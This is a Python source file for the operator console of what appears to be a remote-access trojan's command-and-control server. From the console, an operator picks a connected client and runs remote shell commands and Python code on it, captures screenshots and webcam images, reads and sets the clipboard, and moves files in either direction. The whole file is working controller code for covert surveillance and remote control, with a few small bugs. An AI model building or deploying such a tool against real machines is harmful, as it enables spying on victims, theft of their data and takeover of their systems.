import os
import socket
import platform
import logging

from cryptography import x509
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import padding, serialization

from modules.clients import Client
from modules.baseserver import BaseServer

from modules import screenshot
from modules import webcam
from modules import clipboard
from modules import filetransfer

from utils.prompts import increase_timeout_prompt

if platform.system() != 'Windows':
    # Enables using arrowkeys on unix-like systems
    try:
        import readline
    except ImportError:
        pass

logging.basicConfig(level=logging.DEBUG)
socket.setdefaulttimeout(10)

# Padding for AES
pad = padding.PKCS7(256)
header_length = 8

menu_help = """
Commands:

list
open (ID)
shutdown
help
"""

interact_help = """
Available commands:

shell
python
screenshot
webcam
copy
paste
receive
send
exit/back
"""


class ServerCLI(BaseServer):
    """ CLI for BaseServer """

    def __init__(self, certificate: x509.Certificate, private_key: ec.EllipticCurvePrivateKey):
        super().__init__(certificate, private_key)

    def cli(self) -> None:
        """ Start CLI """
        while True:
            try:
                self.menu()
            except KeyboardInterrupt:
                print('Ctrl-C detected: Shutting down server')
                self.shutdown()
                break
            except Exception as error:
                logging.critical('Critical errors occurred: %s' % str(error))

    def menu(self) -> None:
        """ Menu for interacting with clients """
        command, *args = input('> ').split()

        match command:
            case 'help':
                print(menu_help)
            case 'open':
                self.select(args)
            case 'list':
                self.list_cli()
            case 'shutdown':
                raise KeyboardInterrupt
            case _:
                print('Command was not recognized, type "help" for help.')

    def _select(self, *args) -> None:
        """ Interact with a client """
        selected_client = None
        argument = args[0]

        if not argument:
            print('No client ID was given')
            return

        # Create a copy of the clients list
        # This ensures the list is looped through entirely
        # as some items may be otherwise removed mid loop
        clients = self.clients.copy()

        # Check if the given id matches a client.id
        for client in clients:
            if client.id == argument[0]:
                selected_client = client

        if selected_client is None:
            print('Invalid client ID')
            return

        while True:
            try:
                if self.interact(client):
                    break
            except KeyboardInterrupt:
                print('Ctrl-C detected: Returning to menu')
                break

    def select(self, args):
        """ Interact with client while catching errors """
        try:
            self._select(args)
        except KeyboardInterrupt:
            # Quit selector when ctrl-c is detected
            print()
        except Exception as error:
            logging.error('Client experiened an error: %s' % str(error))

    def interact(self, client: Client) -> None:
        """ Interact with a client """
        command, *args = input(f'{client.address[0]}> ').split()
        match command:
            case 'help':
                print(interact_help)
            case 'exit' | 'back':
                return True
            case 'shell':
                self.shell_cli(client)
            case 'python':
                self.python_cli(client)
            case 'screenshot':
                self.screenshot_cli(client)
            case 'webcam':
                self.webcam_cli(client)
            case 'copy':
                self.copy_cli(client)
            case 'paste':
                self.paste_cli(client)
            case 'receive':
                self.receive_cli(client)
            case 'send':
                self.send_cli(client)
            case _:
                print('Command was not recognized, type "help" for help.')

    def list_cli(self):
        """ CLI for list """
        clients = self.list()
        for client in clients:
            print(f'ID: {client.id} / Address: {client.address}')

    def shell_cli(self, client: Client) -> None:
        """ Open a shell to client """
        logging.debug('Launched shell (%s)' % client.id)
        while True:
            command = input('shell> ')

            # Check for cases where command only affects output visually
            match command.strip():
                case 'exit':
                    break
                case 'clear' | 'cls':
                    if platform.system() == 'Windows':
                        os.system('cls')
                    else:
                        os.system('clear')
                    continue

            # Check if the directory is changed, in which case it should be remembered
            comm, *_ = command.split()
            if comm.lower() in ['cd', 'chdir']:

                print(client.shell(command).decode(), end='')
                # TODO: update cwd accordingly

            # Increase timeout to 60 seconds for shell
            client.conn.settimeout(60)
            try:
                print(client.shell(command).decode(), end='')
            except TimeoutError:
                logging.info('Shell command timed out: %s' % client.id)
                # Prompt user if they want to increase the timeout limit
                if increase_timeout_prompt():
                    # Indefinitely block for output
                    client.conn.settimeout(None)
                    print(client.read().decode(), end='')
            finally:
                # Set timeout back to default
                client.conn.settimeout(socket.getdefaulttimeout())

    def python_cli(self, client: Client) -> None:
        """ Open a python interpreter to client """
        logging.debug('Launched python interpreter (%s)' % client.id)
        while True:
            command = input('>>> ')

            if command.strip().lower() in ['exit', 'exit()']:
                break

            # Increase timeout to 60 seconds for python interpreter
            client.conn.settimeout(60)
            try:
                print(client.python(command).decode(), end='')
            except TimeoutError:
                logging.info('Python command timed out: %s' % client.id)
                # Prompt user if they want to increase the timeout limit
                if increase_timeout_prompt():
                    # Indefinitely block for output
                    client.conn.settimeout(None)
                    print(client.read().decode(), end='')
            finally:
                client.conn.settimeout(socket.getdefaulttimeout())

    def screenshot_cli(self, client: Client) -> None:
        """ Take a screenshot and save it in a file """
        try:
            filename = screenshot.screenshot(client)
        except RuntimeError as error:
            print(str(error))
        else:
            print(f'Saved screenshot: {filename}')

    def webcam_cli(self, client: Client) -> None:
        """ Capture webcam """
        try:
            filename = webcam.webcam(client)
        except RuntimeError as error:
            print(str(error))
        else:
            print(f'Saved webcam capture: {filename}')

    def copy_cli(self, client: Client) -> None:
        """ Copy to client clipboard """
        text = input('Text to copy: ')
        try:
            clipboard.copy(client, text)
        except RuntimeError as error:
            print(str(error))
        else:
            print('Copied to clipboard successfully')

    def paste_cli(self, client: Client) -> None:
        """ Paste from client clipboard """
        try:
            content = clipboard.paste(client)
        except RuntimeError as error:
            print(str(error))
        else:
            print(f'Clipboard:\n"{content}"')

    def receive_cli(self, client: Client) -> None:
        """ Receive a file from the client """
        filename = input('File to transfer: ')
        save_name = input('Save file as: ')
        try:
            filetransfer.receive(client, filename, save_name)
        except RuntimeError as error:
            print(str(error))
        else:
            print('File transferred successfully')

    def send_cli(self, client: Client) -> None:
        """ Send a file to client """
        filename = input('Filename: ')
        save_name = input('Save file as: ')
        try:
            filetransfer.send(client, filename, save_name)
        except RuntimeError as error:
            print(str(error))
        else:
            print('File transferred successfully')


if __name__ == '__main__':

    # Read certficate from file
    with open('cert.pem', 'rb') as file:
        cert = x509.load_pem_x509_certificate(file.read())

    # Read private key from file
    with open('key.pem', 'rb') as file:
        private_key = serialization.load_pem_private_key(file.read(), None)

    # Start server
    server = ServerCLI(cert, private_key)
    server.start(('localhost', 6969))

    # Get a client that connected
    client = server.connections_queue.get()
    print(client.id.encode())

    # Begin server CLI
    server.cli()
